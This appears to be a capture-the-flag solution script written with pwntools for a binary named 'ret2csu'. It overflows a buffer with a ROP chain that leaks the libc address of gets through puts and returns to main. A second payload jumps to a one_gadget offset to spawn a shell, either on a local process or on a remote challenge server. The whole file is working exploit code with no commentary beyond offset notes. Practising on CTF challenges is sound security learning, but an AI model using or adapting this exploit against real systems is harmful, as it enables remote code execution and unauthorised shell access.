from pwn import *
#context.log_level='DEBUG'

p = process("./ret2csu")
elf = ELF("./ret2csu", checksec=False)
libc = ELF("./libc-2.27.so")
rop = ROP(elf)

def start():
	if not args.REMOTE:
		return process("./ret2csu")
	else:
		return remote("34.141.31.183", 31099)

p = start()

def main():

	global rop

	# [RAX] --> offset 0 - size ~200
	# [RSP] --> offset 20 - size ~180
	# [R8] --> offset 0 - size ~200
	pop_rdi = 0x0000000000400703 # pop rdi ; ret

	payload = "A"*20
	payload += p64(pop_rdi)
	payload += p64(elf.got['gets'])
	payload += p64(elf.plt['puts'])
	payload += p64(elf.symbols['main'])

	p.recv()

	p.sendline(payload)
	libc.address = u64(p.recv(6).ljust(8, "\x00")) - libc.symbols['gets']

	payload = "A"*20
	payload += p64(0x10a41c + libc.address)

	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
